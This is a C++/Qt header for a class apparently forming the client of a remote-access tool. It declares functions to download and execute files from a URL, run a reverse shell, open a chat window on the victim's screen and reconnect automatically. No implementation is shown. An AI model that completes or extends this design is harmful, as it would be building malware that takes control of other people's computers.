#pragma once
#include "services/NetService.h"
#include "shared/action_defs.h"
#include "services/ProcessService.h"
#include "ui/qt/ChatDialog.h"
#include "services/NetFileDownloader.h"


class XeytanQppClient : public QObject
{
Q_OBJECT
public:
	XeytanQppClient(QObject* parent = Q_NULLPTR);
	void startService();


	int run(int argc, char** argv);

public slots:
	void onDisconnected();
	void openChatWindow();
	void onChatRequest(ChatAction action, const QString& message);
	void downloadAndExecute(const QString& url);
	void onRequestShell(ShellAction action, const QString& data);
	void onReverseShellProcessExit(int exitCode, QProcess::ExitStatus exitStatus);
	void onReverseShellOutputAvailable(const QString& data) const;

private:
	QSharedPointer<NetService> netService;
	QScopedPointer<ProcessService> processService;
	bool reconnectionScheduled;
	ChatDialog* chatDialog;

	QScopedPointer<NetFileDownloader> netDownloader;
	bool chatting;
};
